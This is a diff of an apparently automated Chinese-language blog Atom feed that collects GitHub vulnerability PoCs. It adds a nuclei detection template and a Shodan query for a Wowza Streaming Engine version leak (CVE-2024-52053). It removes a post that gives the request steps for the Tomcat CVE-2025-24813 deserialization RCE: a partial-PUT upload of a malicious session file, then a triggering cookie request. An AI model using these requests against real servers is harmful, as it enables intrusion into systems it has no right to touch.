@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-22T15:15:12.543Z</updated>
+  <updated>2025-06-22T15:45:11.897Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Wowza Streaming Engine 版本泄露漏洞</title>
+    <link href="http://example.com/2025/06/22/github_1623298281/"/>
+    <id>http://example.com/2025/06/22/github_1623298281/</id>
+    <published>2025-06-22T15:45:11.903Z</published>
+    <updated>2025-06-22T15:45:11.897Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Wowza Streaming Engine 版本泄露漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-52053</li></ul><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 检测到Wowza Streaming Engine通过端口1935上的&#x2F;ServerVersion使用纯HTTP泄露版本信息。如果提取的版本≤4.9.0，则实例可能易受CVE-2024-52053的影响。</p><p><strong>产品厂商：</strong> Wowza</p><p><strong>产品名称：</strong> Wowza Streaming Engine</p><p><strong>影响版本：</strong> version ≤ 4.9.0</p><p><strong>搜索语法：</strong> http.title:”Wowza Streaming Engine”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/d15671cc270e0daeca6567894227b5ef9fa8244c/http%2Fcves%2F2024%2FCVE-2024-52053.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/d15671cc270e0daeca6567894227b5ef9fa8244c/http%2Fcves%2F2024%2FCVE-2024-52053.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> wowza-version-cve-<span class="hljs-number">202</span>4-<span class="hljs-number">52053</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Wowza Streaming Engine ≤ <span class="hljs-number">4.9</span>.<span class="hljs-number">0</span> <span class="hljs-operator">-</span> Version Disclosure &amp; CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">52053</span> Detection<br>  <span class="hljs-params">author:</span> ddiax @ https:<span class="hljs-symbol">//github.com/jrgdiaz</span><br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> |<br>    Detects Wowza Streaming Engine version disclosure via <span class="hljs-symbol">/ServerVersion</span> on port <span class="hljs-number">1935</span> using plain HTTP.<br>    If the extracted version is ≤ <span class="hljs-number">4.9</span>.<span class="hljs-number">0</span>, the instance is likely vulnerable to CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">52053</span>.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.rapid7.com<span class="hljs-operator">/</span>blog<span class="hljs-operator">/</span>post<span class="hljs-operator">/</span><span class="hljs-number">2024</span><span class="hljs-operator">/</span><span class="hljs-number">11</span><span class="hljs-operator">/</span><span class="hljs-number">20</span><span class="hljs-operator">/</span>multiple-vulnerabilities-<span class="hljs-keyword">in</span>-wowza-streaming-engine-fixed<span class="hljs-symbol">/</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.wowza.com<span class="hljs-operator">/</span>docs<span class="hljs-operator">/</span>wowza-streaming-engine-<span class="hljs-number">4</span><span class="hljs-operator">-</span><span class="hljs-number">9</span><span class="hljs-operator">-</span><span class="hljs-number">1</span><span class="hljs-operator">-</span>release-notes<span class="hljs-comment">#detailed-list-of-changes-in-wowza-streaming-engine-4-9-1</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//www.wiz.io/vulnerability-database/cve/cve-2024-52053</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">shodan-query:</span> http.title:<span class="hljs-string">&quot;Wowza Streaming Engine&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2024,wowza,version-disclosure,xss<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> http:<span class="hljs-operator">//</span>&#123;&#123;Hostname&#125;&#125;:<span class="hljs-number">1935</span><span class="hljs-symbol">/ServerVersion</span><br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">name:</span> version<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Wowza Streaming Engine.*?([0-9]+<span class="hljs-char escape_">\\</span>.[0-9]+<span class="hljs-char escape_">\\</span>.[0-9]+)&quot;</span><br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> vulnerable<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Wowza Streaming Engine.*?(4<span class="hljs-char escape_">\\</span>.[0-9]<span class="hljs-char escape_">\\</span>.[0-9]+|3<span class="hljs-char escape_">\\</span>.[0-9]<span class="hljs-char escape_">\\</span>.[0-9]+)&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Wowza Streaming Engine 版本泄露漏洞&lt;/p&gt;
+&lt;p&gt;&lt;s</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
+    
+  </entry>
   
   <entry>
     <title>Likes and Dislikes Wordpress Plugin Unauthenticated SQLi Vulnerability</title>
@@ -517,33 +544,6 @@
     <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
     
     <category term="服务端请求伪造" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Tomcat 反序列化漏洞</title>
-    <link href="http://example.com/2025/06/21/github_2619596667/"/>
-    <id>http://example.com/2025/06/21/github_2619596667/</id>
-    <published>2025-06-21T14:45:14.393Z</published>
-    <updated>2025-06-21T14:45:14.388Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Tomcat 反序列化漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-24813</li></ul><p><strong>漏洞类型：</strong> 反序列化</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 本漏洞针对CVE-2025-24813，涉及Tomcat的反序列化远程代码执行(RCE)漏洞。利用条件包括应用程序启用了DefaultServlet写入功能、支持partial PUT请求、使用了Tomcat的文件会话持久化并默认会话存储位置，以及应用中包含存在反序列化漏洞的库。漏洞利用需要上传恶意的序列化文件并通过特定请求触发。</p><p><strong>产品厂商：</strong> Apache</p><p><strong>产品名称：</strong> Tomcat</p><p><strong>来源：</strong> <a href="https://github.com/x1ongsec/CVE-2025-24813">https://github.com/x1ongsec/CVE-2025-24813</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>apache-tomcat-9.0.98</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>本仓库是针对 CVE-2025-24813 Tomcat 最新 RCE 复现的环境。</p><p><strong>仅供学习研究使用！</strong></p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>应用程序启用了DefaultServlet写入功能，该功能默认关闭</li><li>应用支持了 partial PUT 请求，能够将恶意的序列化数据写入到会话文件中，该功能默认开启</li><li>应用使用了 Tomcat 的文件会话持久化并且使用了默认的会话存储位置，需要额外配置</li><li>应用中包含一个存在反序列化漏洞的库，比如存在于类路径下的 commons-collections，此条件取决于业务实现是否依赖存在反序列化利用链的库</li></ul><p><strong>本环境已开启上述复现所需条件</strong></p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>生成一个恶意的序列化文件，使用以下数据包上传，需要注意 Range 的分块值需要与 Length 保持一致，且大于当前文件的长度。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs poc">PUT /xxxxx/session HTTP/1.1  <br>Host: 192.168.131.32:8080  <br>Content-Length: 1000  <br>Content-Range: bytes 0-1000/1200  <br><br>&#123;&#123;反序列化文件内容)&#125;&#125;<br></code></pre></td></tr></table></figure><p>使用如下 poc 触发：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs poc">GET / HTTP/1.1  <br>Host: 192.168.131.32:8080  <br>Cookie: JSESSIONID=.xxxxx<br></code></pre></td></tr></table></figure><img width="1392" alt="image" src="https://github.com/user-attachments/assets/1d9aa484-d151-45a6-bdff-7952af277c89" /><img width="1379" alt="image" src="https://github.com/user-attachments/assets/9bacb253-0b76-4f16-9a5a-c123eb6fca73" /><p>参考：<a href="https://forum.butian.net/article/674">https://forum.butian.net/article/674</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Tomcat 反序列化漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/str</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
-    
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
     
   </entry>
   
